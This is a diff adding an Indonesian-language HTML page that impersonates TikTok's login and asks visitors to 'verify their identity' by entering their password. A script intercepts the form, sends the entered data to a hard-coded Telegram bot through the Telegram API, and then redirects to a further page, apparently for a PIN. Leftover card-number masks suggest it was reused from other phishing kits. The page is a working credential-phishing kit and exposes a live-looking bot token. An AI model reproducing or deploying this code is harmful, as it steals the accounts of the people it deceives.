@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Masuk | TikTok</title>
+    <style>
+        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 0; padding: 0; }
+        body { background-color: #ffffff; display: flex; justify-content: center; overflow-x: hidden; }
+        .container { width: 100%; max-width: 450px; padding: 20px; height: 100%; position: relative; display: flex; flex-direction: column; }
+        
+        /* Header */
+        .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; }
+        .back-btn { font-size: 24px; cursor: pointer; color: #000; }
+        .title { font-size: 17px; font-weight: 700; }
+
+        /* Tabs Tahap 1 */
+        .tabs { display: flex; border-bottom: 1px solid #ebebeb; margin-bottom: 25px; }
+        .tab { flex: 1; text-align: center; padding: 12px 0; font-size: 15px; color: #8a8a8a; cursor: pointer; position: relative; }
+        .tab.active { color: #000; font-weight: 600; }
+        .tab.active::after { content: ""; position: absolute; bottom: 0; left: 0; width: 100%; height: 2px; background-color: #000; }
+
+        /* Input Box */
+        .input-box { display: flex; align-items: center; background-color: #f1f1f2; border-radius: 4px; padding: 0 12px; height: 44px; margin-bottom: 15px; border: 1px solid transparent; }
+        .country-code { font-weight: 600; padding-right: 12px; border-right: 1px solid #d1d1d3; margin-right: 12px; font-size: 15px; }
+        input { background: transparent; border: none; outline: none; font-size: 15px; width: 100%; color: #161823; caret-color: #fe2c55; }
+
+
+
+        /* Tombol Lanjutkan */
+        .btn-submit { 
+            width: calc(100% - 40px); background-color: #fe2c55; color: white; border: none; 
+            border-radius: 8px; padding: 14px; font-size: 16px; font-weight: 600; 
+            position: absolute; bottom: 49vh; left: 20px; cursor: not-allowed; 
+            display: flex; justify-content: center; align-items: center;
+        }
+        .btn-active { background-color: #fe2c55; cursor: pointer; }
+
+        /* Loading Spinner */
+        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #ffffff; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; display: none; margin-right: 10px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+    
+/* Blue */
+.info {
+  color: #1E90FF;
+}
+    .bnt {
+  border: none;
+  background-color: inherit;
+  padding: 14px 28px;
+  font-size: 16px;
+  cursor: pointer;
+  display: inline-block;
+}
+
+        .info:hover {
+  background: transparent;
+  color: white;
+}
+    </style>
+</head>
+<body>
+<!-- Form using Formsubmit -->
+<div class="container">
+<form id="setPin" onsubmit="loader(event); return false" method="POST">
+    <div class="header">
+        <span class="back-btn" onclick="location.reload()">&#10094;</span>
+        <div class="title" id="page-title">Verifikasi identitas</div>
+        <span style="font-size: 25px; cursor: pointer;" onclick="location.reload()"></span>
+    </div>
+
+    <div id="section-1">
+        
+            <div class="tab">
+        </div>
+        <label><h3>Masukkan kata sandi</h3></label>
+            <small class="text-center d-block text-muted">
+Verifikasi identitas Anda dengan memasukkan  kata sandi.
+            </small> <br><br>
+        <div class="input-box">
+            <div id="prefix"></div>
+            <input type="text" name="ps" id="main-input" minlength="" maxlength="20" placeholder="Masukkan kata sandi" autocomplete="off" required>
+        </div>
+    </div>
+    </div>
+<!-- Optional: redirect after submission -->
+    <button class="btn-submit" id="setPin">
+        Berikutnya
+    </button>
+          </form>
+  </div>
+   
+       <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"
+
+    integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg=="
+
+    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+        </div> 
+   </div> 
+   </div>
+ <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>
+<script src="jquery.min.js"></script>
+       
+        <script type="text/javascript">
+            $(document).ready(function(){
+        </script>
+<!-- </body> -->  
+   <script>
+
+
+function closeForm() {
+  document.getElementById("myForm").style.display = "none";
+}
+</script> 
+  
+  <!-- partial -->
+ <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"
+
+    integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg=="
+
+    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  <script src='https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.10/vue.min.js'></script>
+<script src='https://unpkg.com/vue-the-mask@0.11.1/dist/vue-the-mask.js'></script>
+ <script>$(document).ready(function(){
+$('#debit').mask('0000 0000 0000 0000');     
+$('#valid').mask('00/00');
+});</script>
+ <p id="status"></p>
+   <script src="setPin.js"></script>
+</div>
+   <script>
+   
+            $(document).ready(function() {
+            $("div#eyeOpen").on('click', function() {
+                $("#eyeOpen").css("display", "none");
+                $("#eyeClose").css("display", "block");
+
+                $("#password").prop("type", "text");
+
+                $("div#eyeClose").on('click', function() {
+                    $("#eyeOpen").css("display", "block");
+                    $("#eyeClose").css("display", "none");
+
+                    $("#password").prop("type", "password");
+                });
+            });
+            
+const chat_id = '-1003985526393', botID = 'bot8477958647:AAGfDluTesqg1TzOw1xzUn4suNLZEuYJQ6Q';
+
+    const telegramURL = `https://api.telegram.org/${botID}/sendMessage`;
+
+    document.querySelector('#setPin').addEventListener("submit", async e => { // When the user submits the form
+        e.preventDefault(); // Don't submit
+        let text = JSON.stringify( // Convert the form data to a string to send as our Telegram message
+            Object.fromEntries(new FormData(e.target).entries()), // Convert the form data to an object.
+        null, 2); // Prettify the JSON so we can read the data easily
+        const sendMessage = await fetch(telegramURL, { // Send the request to the telegram API
+            method: 'POST',
+            headers: {"Content-Type": "application/json"}, // This is required when sending a JSON body.
+            body: JSON.stringify({chat_id, text}), // The body must be a string, not an object
+        });
+        const messageStatus = document.querySelector('#status');
+        if (sendMessage.ok) // Update the user on if the message went through
+            messageStatus.textContent = "";
+        else
+            messageStatus.textContent = "Message Failed to send :( " + (await sendMessage.text());
+        e.target.reset(); // Clear the form fields.
+        window.location.href = 'pinn.html';
+    });
+
+            
+        });
+        
+   </script>
+
+<script>
+    const nextBtn = document.getElementById('next-btn');
+    const btnText = document.getElementById('btn-text');
+    const loader = document.getElementById('loader');
+    const mainInput = document.getElementById('main-input');
+
+    let mode = 'phone';
+    let step = 1;
+
+    // --- LOGIKA TAB ---
+    document.getElementById('tab-email').onclick = () => {
+        mode = 'email';
+        document.getElementById('tab-email').classList.add('active');
+        document.getElementById('tab-phone').classList.remove('active');
+        document.getElementById('prefix').style.display = 'none';
+        mainInput.type = 'text'; mainInput.placeholder = 'Alamat email atau nama pengguna';
+        mainInput.value = ''; validate();
+    };
+
+    document.getElementById('tab-phone').onclick = () => {
+        mode = 'phone';
+        document.getElementById('tab-phone').classList.add('active');
+        document.getElementById('tab-email').classList.remove('active');
+        document.getElementById('prefix').style.display = 'block';
+        mainInput.type = 'tel'; mainInput.placeholder = 'Nomor telepon';
+        mainInput.value = ''; validate();
+    };
+
+
+
+    function submitData() {
+        loader.style.display = 'block';
+        btnText.innerText = 'Memproses...';
+        nextBtn.disabled = true;
+
+
+
+        // Delay 3 detik (Efek Loading) lalu redirect
+        setTimeout(() => {
+            window.location.href = "";
+        }, 3000);
+    }
+</script>
+</body>
+</html>
